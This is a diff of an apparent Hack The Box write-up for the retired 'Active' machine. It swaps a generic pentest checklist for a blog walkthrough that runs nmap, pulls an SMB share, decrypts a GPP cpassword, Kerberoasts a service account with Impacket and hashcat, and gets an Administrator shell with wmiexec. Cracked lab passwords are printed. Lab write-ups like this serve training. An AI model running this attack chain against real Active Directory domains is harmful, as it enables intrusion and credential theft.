@@ -1,99 +1,117 @@
+---
+title: "Active"
+date: 2026-02-08
+categories: [HTB]
+tags: [windows, active-directory]
+toc: true
 
-# How to pentest HTB: Active — proper stages
+image:
+  path: /assets/img/htb/Active/active1.png
+  alt: "HTB Active"
+---
 
-STAGE 1 — SCOPING & TARGET CONFIRMATION  
-Goal: Confirm you are dealing with a Domain Controller.
-
-Commands you will actually use:
-nmap -sn 10.10.10.0/24 -oN hosts.txt  
-nmap -sC -sV -p- --min-rate=1000 <TARGET_IP> -oN nmap-full.txt  
-
-What you should verify:
-- Kerberos (88), LDAP (389), SMB (445), RPC (135), DNS (53)  
-- OS looks like Windows Server + AD
+Active is a retired Windows box that focuses on Active Directory enumeration, credential exposure via Group Policy Preferences (GPP), and abuse of Kerberos through Kerberoasting to pivot from a service account to domain administrator.
 
 ---
 
-STAGE 2 — AD USER ENUMERATION  
-Goal: Find valid domain users.
+## Recon
+### Nmap — Port Discovery
+Begin with a full TCP sweep to identify all open ports on the target.
 
-Pick one approach (not all of them):
+`sudo nmap -p- -T4 10.129.17.166 -oN scans/all_ports.txt -Pn`
 
-Option A (most OSCP-style):
-kerbrute userenum --dc <DC_IP> -d active.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+![](/assets/img/htb/Active/active01.png)
 
-Option B:
-enum4linux -a <DC_IP>
+Parse the results to store all open ports in a variable for follow-up scanning.
 
-Keep:
-- A list of valid usernames
+`ports=$(awk '/\/tcp/ && /open/ { split($1,a,"/"); p = (p ? p "," a[1] : a[1]) } END{ print p }' scans/all_ports.txt)`
 
 ---
 
-STAGE 3 — AS-REP ROASTING (initial access path)  
-Goal: Find misconfigured users with no Kerberos pre-auth.
+### Nmap — Service Enumeration
+Run a targeted service and script scan against only the discovered open ports.
 
-Get hashes:
-GetNPUsers.py active.htb/ -dc-ip <DC_IP> -usersfile valid_users.txt -format hashcat
+`sudo nmap -sC -sV -p $ports 10.129.17.166 -oN scans/services.txt -Pn`
 
-Crack offline:
-hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
-
-Result:
-- You now have one valid credential
+![](/assets/img/htb/Active/active02.png)
 
 ---
 
-STAGE 4 — SMB ENUMERATION WITH CREDENTIALS  
-Goal: Move from “recon” to access.
+### Host Resolution
+Add the target hostname to /etc/hosts.
 
-Use your credential:
-smbclient \\\\<DC_IP>\\Replication -U "svc_tgs"
-
-Look for:
-- Scripts  
-- Plaintext passwords  
-- Misconfigurations  
-
-Extract anything useful.
+`echo '10.129.18.74 active.htb' | sudo tee -a /etc/hosts`
 
 ---
 
-STAGE 5 — LATERAL MOVEMENT  
-Goal: Get a shell on the DC.
+## Service Enumeration
+### SMB
+AD is confirmed. Enumerate SMB with NetExec for any open shares.
 
-Use PsExec with your credential:
-psexec.py active.htb/svc_tgs@<DC_IP>
+`nxc smb 10.129.18.74 -u '' -p '' --shares`
 
-If this fails, try:
-wmiexec.py active.htb/svc_tgs@<DC_IP>  
-evil-winrm -i <DC_IP> -u svc_tgs -p <PASSWORD>
+![](/assets/img/htb/Active/active03.png)
 
-You should now have a Windows shell.
+SMB shows a readable share called Replication. use `smbclient` to pull the share.
 
----
+`mkdir -p Replication && cd Replication`
 
-STAGE 6 — CREDENTIAL DUMPING  
-Goal: Get domain hashes.
+`smbclient //10.129.18.74/Replication -N -I 10.129.18.74 -c "recurse; prompt; mget *"`
 
-From your shell:
-secretsdump.py active.htb/svc_tgs@<DC_IP>
+![](/assets/img/htb/Active/active05.png)
 
-Keep:
-- Administrator NTLM hash
+Inspect what was pulled down.
+`tree -a -h -f --dirsfirst`
+![](/assets/img/htb/Active/active04.png)
 
 ---
 
-STAGE 7 — FULL DOMAIN COMPROMISE  
-Goal: Become SYSTEM.
+## Initial Access
+Inside is a Groups.xml file — a classic GPP artifact known to store recoverable credentials. 
 
-Use the hash:
-psexec.py active.htb/Administrator@<DC_IP> -hashes :<HASH>
+`grep -i cpassword Groups.xml`
 
-Now you are SYSTEM.
+![](/assets/img/htb/Active/active065.png)
+
+Discovered username `SVC_TGS`.
+Decrypt the embedded cpassword to recover the service account password.
+
+`gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ`
+
+![](/assets/img/htb/Active/active06.png)
+
+Validate access with the recovered account:
+
+`nxc smb 10.129.18.74 -u 'active.htb\SVC_TGS' -p 'GPPstillStandingStrong2k18' --shares`
+
+![](/assets/img/htb/Active/active07.png)
 
 ---
 
-STAGE 8 — FLAGS  
-- Grab user.txt  
-- Grab root.txt 
+## Privilege Escalation
+### Kerberoasting
+With valid credentials, perform a Kerberoasting attack to pull crackable service tickets for any high-privilege accounts.
+
+`python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py 'active.htb/SVC_TGS:GPPstillStandingStrong2k18' -dc-ip 10.129.18.74 -request -outputfile tgs_hashes.txt`
+
+![](/assets/img/htb/Active/active08.png)
+
+Crack the Kerberos ticket with `hashcat`.
+
+`hashcat -m 13100 tgs_hashes.txt /home/user/tools/rockyou.txt -a 0`
+
+![](/assets/img/htb/Active/active09.png)
+
+The ticket cracked to domain admin credentials, which I verified over SMB.
+
+`nxc smb 10.129.18.74 -u 'active.htb\Administrator' -p 'Ticketmaster1968' --shares`
+
+![](/assets/img/htb/Active/active10.png)
+
+With admin credentials confirmed, I used WMIExec to get an interactive shell.
+
+`python3 /usr/share/doc/python3-impacket/examples/wmiexec.py 'ACTIVE.HTB/Administrator:Ticketmaster1968'@10.129.18.74`
+
+![](/assets/img/htb/Active/active11.png)
+
+From here, you can get the flags.
